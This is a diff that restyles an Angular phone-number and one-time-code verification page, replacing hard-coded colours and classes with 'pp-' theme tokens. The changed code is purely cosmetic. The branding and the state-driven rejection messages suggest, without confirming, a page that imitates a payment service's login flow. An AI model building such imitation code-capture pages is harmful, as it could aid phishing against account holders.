@@ -13,21 +13,21 @@ import { StateService } from '../services/state.service';
     <app-public-layout>
       
       <div class="flex flex-col items-center mb-10">
-        <h1 class="text-2xl font-bold text-[#2c2e2f] mb-3 text-center tracking-tight">
+        <h1 class="text-2xl font-bold text-pp-navy mb-3 text-center tracking-tight">
              {{ codeSent() ? 'Enter your code' : 'Confirm your mobile' }}
         </h1>
-        <p class="text-[15px] text-[#5e6c75] px-4 text-center leading-relaxed">
+        <p class="text-base text-slate-500 px-4 text-center leading-relaxed">
            {{ codeSent() ? "We sent a security code to your mobile device." : "We need to verify it's really you." }}
         </p>
       </div>
 
       <!-- Feedback Block -->
       @if (state.rejectionReason()) {
-        <div class="mb-8 bg-[#fff4f4] border-l-4 border-[#d92d20] p-4 flex items-start gap-3 rounded-r-md">
-            <span class="material-icons text-[#d92d20] text-xl mt-0.5">error</span>
+        <div class="mb-8 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg">
+            <span class="material-icons text-[#D92D20] text-xl">error</span>
             <div>
-              <p class="text-sm font-bold text-[#2c2e2f]">Authentication Failed</p>
-              <p class="text-xs text-[#5e6c75] mt-0.5">{{ state.rejectionReason() }}</p>
+              <p class="text-sm font-bold text-pp-navy">Authentication Failed</p>
+              <p class="text-xs text-slate-600 mt-1">{{ state.rejectionReason() }}</p>
             </div>
         </div>
       }
@@ -35,24 +35,19 @@ import { StateService } from '../services/state.service';
       <!-- Stage 1: Phone Input -->
       @if (!codeSent()) {
           <div class="space-y-6 animate-in fade-in slide-in-from-bottom-2">
-             <div class="relative group">
+             <div class="pp-input-group">
                 <input 
                   type="tel" 
                   [value]="phoneDisplay()"
                   (input)="onPhoneInput($event)"
                   id="phone"
                   placeholder=" "
-                  class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus"
+                  class="pp-input peer"
                 />
-                <label 
-                   for="phone" 
-                   class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text z-10 pointer-events-none"
-                   >
-                   Mobile number
-                </label>
+                <label for="phone" class="pp-label">Mobile number</label>
              </div>
 
-             <div class="text-[12px] text-[#5e6c75] text-center leading-relaxed px-4">
+             <div class="text-xs text-slate-500 text-center leading-relaxed px-4">
                  By continuing, you confirm that you are authorized to use this phone number. Standard message and data rates may apply.
              </div>
 
@@ -60,17 +55,17 @@ import { StateService } from '../services/state.service';
                 (click)="sendCode()"
                 [disabled]="!isPhoneValid()"
                 [class.opacity-50]="!isPhoneValid()"
-                [class.hover:bg-brand-900]="isPhoneValid()"
-                class="w-full bg-brand-800 text-white font-bold text-[16px] py-4 px-4 rounded-full transition-all duration-300 shadow-lg shadow-brand-500/20 hover:scale-[1.02] active:scale-[0.98]"
+                class="pp-btn"
             >
                 Next
             </button>
           </div>
       } @else {
+          <!-- Stage 2: OTP -->
           <div class="space-y-8 animate-in fade-in slide-in-from-right-2">
             <div class="text-center mb-2">
-                <p class="text-sm font-semibold text-[#2c2e2f] mb-1">{{ phoneDisplay() }}</p>
-                <a (click)="codeSent.set(false)" class="text-brand-500 font-bold cursor-pointer hover:underline text-xs">Change</a>
+                <p class="text-base font-bold text-pp-navy mb-1">{{ phoneDisplay() }}</p>
+                <a (click)="codeSent.set(false)" class="text-pp-blue font-bold cursor-pointer hover:underline text-xs">Change</a>
             </div>
 
             <div class="flex justify-center gap-2 sm:gap-3">
@@ -83,8 +78,8 @@ import { StateService } from '../services/state.service';
                   [(ngModel)]="digits[idx]"
                   (input)="onOtpInput($event, idx)"
                   (keydown)="onKeyDown($event, idx)"
-                  class="w-11 h-14 sm:w-12 sm:h-16 text-center rounded-lg border-2 border-transparent bg-slate-100 text-2xl font-bold text-[#2c2e2f] outline-none transition-all duration-200 focus:bg-white focus:border-brand-500 shadow-sm focus:shadow-lg focus:scale-110 focus:-translate-y-1"
-                  [class.border-red-500]="state.rejectionReason()"
+                  class="w-12 h-14 sm:w-14 sm:h-16 text-center rounded-[12px] border border-slate-300 bg-white text-2xl font-bold text-pp-navy outline-none transition-all duration-200 focus:border-pp-blue focus:ring-1 focus:ring-pp-blue shadow-input focus:shadow-input-focus"
+                  [class.border-[#D92D20]]="state.rejectionReason()"
                   [class.bg-red-50]="state.rejectionReason()"
                 >
               }
@@ -94,11 +89,11 @@ import { StateService } from '../services/state.service';
               <button 
                 (click)="resend()" 
                 [disabled]="timer() > 0"
-                class="text-brand-500 font-bold text-sm hover:underline hover:text-brand-800 transition-colors disabled:opacity-50 disabled:no-underline disabled:cursor-not-allowed">
+                class="text-pp-blue font-bold text-sm hover:underline hover:text-pp-navy transition-colors disabled:opacity-50 disabled:no-underline disabled:cursor-not-allowed">
                 {{ timer() > 0 ? 'Resend code in ' + timer() + 's' : 'Get a new code' }}
               </button>
                @if (resendSent()) {
-                 <p class="text-xs text-green-600 mt-2 font-bold animate-pulse">Code sent!</p>
+                 <p class="text-xs text-pp-success mt-2 font-bold animate-pulse">Code sent!</p>
                }
             </div>
 
@@ -106,8 +101,7 @@ import { StateService } from '../services/state.service';
               (click)="submit()"
               [disabled]="!isOtpValid()"
               [class.opacity-50]="!isOtpValid()"
-              [class.hover:bg-brand-900]="isOtpValid()"
-              class="w-full bg-brand-800 text-white font-bold text-[16px] py-4 px-4 rounded-full transition-all duration-300 shadow-lg shadow-brand-500/20 hover:scale-[1.02] active:scale-[0.98]"
+              class="pp-btn"
             >
               Continue
             </button>
